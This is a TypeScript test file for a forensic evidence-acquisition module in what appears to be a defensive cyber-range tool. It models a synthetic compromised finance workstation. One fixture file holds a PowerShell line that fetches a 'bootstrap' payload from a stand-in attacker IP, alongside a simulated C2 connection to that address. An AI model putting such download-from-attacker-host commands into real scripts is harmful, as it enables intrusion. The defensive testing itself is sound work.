import {
  describe,
  expect,
  it,
} from "vitest";

import {
  createRangeArtifact,
} from "./rangeArtifact";

import {
  createSyntheticHostState,
  executeSyntheticHostCommand,
} from "./syntheticHost";

import type {
  SyntheticHostCommandInvocation,
} from "./syntheticHost";

const host = createSyntheticHostState({
  deviceId: "device-fin-04",
  capabilities: [
    "read:filesystem",
    "read:network",
    "terminate:process",
  ],
  files: [
    {
      path: "/Users/smartinez/AppData/Local/Temp/finance-update.ps1",
      content:
        "Invoke-WebRequest https://203.0.113.77/bootstrap",
      sha256:
        "abcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd",
      owner: "smartinez",
      quarantined: false,
    },
  ],
  processes: [
    {
      pid: 8420,
      image: "powershell.exe",
      commandLine: "powershell.exe -File finance-update.ps1",
      state: "running",
    },
  ],
  network: {
    listeners: [],
    connections: [
      {
        id: "connection-c2",
        protocol: "tcp",
        localAddress: "10.20.30.44",
        localPort: 49714,
        remoteAddress: "203.0.113.77",
        remotePort: 443,
        state: "established",
        processId: 8420,
      },
    ],
  },
});

function execute(
  invocation: SyntheticHostCommandInvocation,
) {
  return executeSyntheticHostCommand(
    host,
    invocation,
  );
}

describe("Range acquisition artifacts", () => {
  it("preserves deterministic file content, source provenance, and authored integrity", () => {
    const invocation: SyntheticHostCommandInvocation = {
      id: "range-command-1",
      timestamp: "2026-08-21T05:00:01.000Z",
      command: {
        type: "read_file",
        path: "/Users/smartinez/AppData/Local/Temp/finance-update.ps1",
      },
    };
    const execution = execute(invocation);
    const input = {
      id: "range-command-1-artifact",
      acquiredAt: "2026-08-21T05:00:01.001Z",
      deviceId: "device-fin-04",
      invocation,
      execution,
    } as const;

    const first = createRangeArtifact(input);
    const second = createRangeArtifact(input);

    expect(second).toEqual(first);
    expect(first.kind).toBe("file");
    expect(first.sourceReference).toBe(
      "/Users/smartinez/AppData/Local/Temp/finance-update.ps1",
    );
    expect(first.integrity).toEqual({
      status: "authored",
      algorithm: "sha256",
      value:
        "abcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd",
    });

    if (
      first.kind !== "file" ||
      first.snapshot.scope !== "single"
    ) {
      throw new Error("Expected a single-file artifact.");
    }

    expect(first.snapshot.file.content).toContain(
      "203.0.113.77/bootstrap",
    );
    expect(first.snapshot.file.sha256).toBe(
      "abcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd",
    );
  });

  it("captures structured network state and indicators", () => {
    const invocation: SyntheticHostCommandInvocation = {
      id: "range-command-2",
      timestamp: "2026-08-21T05:00:02.000Z",
      command: {
        type: "list_network",
      },
    };
    const artifact = createRangeArtifact({
      id: "range-command-2-artifact",
      acquiredAt: "2026-08-21T05:00:02.001Z",
      deviceId: "device-fin-04",
      invocation,
      execution: execute(invocation),
    });

    expect(artifact.kind).toBe("network");
    expect(artifact.indicatorIps).toContain(
      "203.0.113.77",
    );

    if (artifact.kind !== "network") {
      throw new Error("Expected a network artifact.");
    }

    expect(artifact.snapshot.connections).toContainEqual(
      expect.objectContaining({
        remoteAddress: "203.0.113.77",
        remotePort: 443,
        processId: 8420,
      }),
    );
  });

  it("does not acquire mutation executions as duplicate evidence", () => {
    const invocation: SyntheticHostCommandInvocation = {
      id: "range-command-3",
      timestamp: "2026-08-21T05:00:03.000Z",
      command: {
        type: "terminate_process",
        pid: 8420,
      },
    };

    expect(() =>
      createRangeArtifact({
        id: "range-command-3-artifact",
        acquiredAt: "2026-08-21T05:00:03.001Z",
        deviceId: "device-fin-04",
        invocation,
        execution: execute(invocation),
      }),
    ).toThrow(
      "Range mutation executions cannot be acquired as evidence artifacts.",
    );
  });
});
